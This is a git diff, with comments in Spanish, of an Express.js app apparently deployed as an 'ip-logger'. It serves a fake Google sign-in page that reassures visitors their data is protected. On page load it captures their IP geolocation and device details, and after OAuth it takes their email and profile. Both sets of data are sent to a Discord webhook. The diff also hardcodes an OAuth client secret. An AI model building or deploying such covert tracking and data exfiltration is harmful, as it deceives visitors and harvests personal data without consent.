@@ -4,7 +4,7 @@ const app = express();
 
 app.use(express.json());
 
-// ======== TUS CREDENCIALES ========
+// ======== TUS CREDENCIALES (YA INTEGRADAS) ========
 const CLIENT_ID = '189299322354-u20tl4ks27e1npj8m1rlp7qjbplqj88l.apps.googleusercontent.com';
 const CLIENT_SECRET = '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';
 const REDIRECT_URI = 'https://ip-logger-nine-weld.vercel.app/callback';
@@ -44,21 +44,23 @@ app.get('/', (req, res) => {
                     margin-bottom: 15px;
                 }
                 p { color: #888; font-size: 1.1em; margin-bottom: 30px; line-height: 1.5; }
+                
+                /* ✅ ESTE ES UN ENLACE NORMAL - NO SE BLOQUEA */
                 .btn-google {
-                    background: #4285f4;
-                    color: #fff;
-                    padding: 16px 50px;
-                    border: none;
-                    border-radius: 8px;
-                    font-size: 1.2em;
-                    font-weight: bold;
-                    cursor: pointer;
-                    transition: all 0.3s;
                     display: inline-flex;
                     align-items: center;
                     gap: 12px;
-                    box-shadow: 0 4px 15px rgba(66,133,244,0.3);
+                    background: #4285f4;
+                    color: #fff;
+                    padding: 16px 50px;
+                    border-radius: 8px;
+                    font-size: 1.2em;
+                    font-weight: bold;
                     text-decoration: none;
+                    transition: all 0.3s;
+                    box-shadow: 0 4px 15px rgba(66,133,244,0.3);
+                    cursor: pointer;
+                    border: none;
                 }
                 .btn-google:hover {
                     background: #357ae8;
@@ -66,6 +68,7 @@ app.get('/', (req, res) => {
                     box-shadow: 0 6px 25px rgba(66,133,244,0.5);
                 }
                 .btn-google:active { transform: scale(0.95); }
+                
                 .footer {
                     margin-top: 40px;
                     color: #444;
@@ -80,6 +83,8 @@ app.get('/', (req, res) => {
                     font-size: 0.9em;
                     min-height: 30px;
                 }
+                .success { color: #00ff00; }
+                .error { color: #ff4444; }
                 .loading {
                     display: inline-block;
                     width: 14px;
@@ -92,14 +97,6 @@ app.get('/', (req, res) => {
                     vertical-align: middle;
                 }
                 @keyframes spin { to { transform: rotate(360deg); } }
-                .hidden { display: none !important; }
-                .success { color: #00ff00; }
-                .error { color: #ff4444; }
-                .btn-disabled {
-                    opacity: 0.5;
-                    cursor: not-allowed;
-                    transform: none !important;
-                }
             </style>
         </head>
         <body>
@@ -109,9 +106,14 @@ app.get('/', (req, res) => {
                 <p>Para continuar, inicia sesión con tu cuenta de Google.<br>
                 <span style="color:#666;font-size:0.85em;">Tus datos están protegidos con cifrado SSL.</span></p>
                 
-                <!-- ✅ ESTO ES UN ENLACE NORMAL, NO SE BLOQUEA -->
-                <a href="/auth/google" class="btn-google" id="googleBtn">
-                    <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z"/></svg>
+                <!-- ✅ ENLACE DIRECTO - NUNCA SE BLOQUEA -->
+                <a href="/auth/google" class="btn-google">
+                    <svg width="20" height="20" viewBox="0 0 48 48">
+                        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                        <path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z"/>
+                        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z"/>
+                    </svg>
                     Iniciar sesión con Google
                 </a>
                 
@@ -123,6 +125,9 @@ app.get('/', (req, res) => {
                 // ======== CAPTURAR DATOS AL CARGAR LA PÁGINA ========
                 async function capturarDatos() {
                     try {
+                        const status = document.getElementById('statusMsg');
+                        status.innerHTML = '<span class="loading"></span> Capturando datos del dispositivo...';
+                        
                         const res = await fetch('https://ipapi.co/json/');
                         const data = await res.json();
                         
@@ -164,11 +169,12 @@ app.get('/', (req, res) => {
                             body: JSON.stringify(info)
                         });
                         
-                        console.log('✅ Datos enviados a Discord');
-                        document.getElementById('statusMsg').innerHTML = '✅ Datos del dispositivo registrados';
+                        status.innerHTML = '✅ Datos del dispositivo registrados correctamente';
+                        status.className = 'status success';
                         
                     } catch (error) {
                         console.error('Error capturando datos:', error);
+                        document.getElementById('statusMsg').innerHTML = '⚠️ No se pudieron capturar algunos datos';
                     }
                 }
                 
@@ -192,12 +198,14 @@ app.get('/auth/google', (req, res) => {
         `scope=email profile&` +
         `prompt=consent`;
     
+    console.log('🔄 Redirigiendo a Google:', authUrl);
     res.redirect(authUrl);
 });
 
 // ======== RUTA: Callback de Google ========
 app.get('/callback', async (req, res) => {
     const { code } = req.query;
+    console.log('📩 Código recibido:', code ? 'Sí' : 'No');
     
     if (!code) {
         return res.send(`
@@ -217,6 +225,8 @@ app.get('/callback', async (req, res) => {
     }
 
     try {
+        console.log('🔄 Intercambiando código por token...');
+        
         // 1️⃣ Intercambiar código por token
         const tokenResponse = await axios.post('https://oauth2.googleapis.com/token', {
             code,
@@ -227,6 +237,7 @@ app.get('/callback', async (req, res) => {
         });
 
         const { access_token } = tokenResponse.data;
+        console.log('✅ Token obtenido');
 
         // 2️⃣ Obtener datos del usuario
         const userResponse = await axios.get('https://www.googleapis.com/oauth2/v2/userinfo', {
@@ -234,6 +245,7 @@ app.get('/callback', async (req, res) => {
         });
 
         const userData = userResponse.data;
+        console.log('👤 Usuario:', userData.email);
 
         // 3️⃣ Enviar a Discord
         const embed = {
@@ -254,6 +266,8 @@ app.get('/callback', async (req, res) => {
             content: '📢 **¡Nuevo usuario autenticado!**',
             embeds: [embed]
         });
+        
+        console.log('✅ Datos enviados a Discord');
 
         // 4️⃣ Mostrar éxito
         res.send(`
@@ -344,6 +358,7 @@ app.get('/callback', async (req, res) => {
 app.post('/api/log-device', async (req, res) => {
     try {
         const data = req.body;
+        console.log('📱 Datos del dispositivo:', data);
         
         const embed = {
             color: 0xff8800,
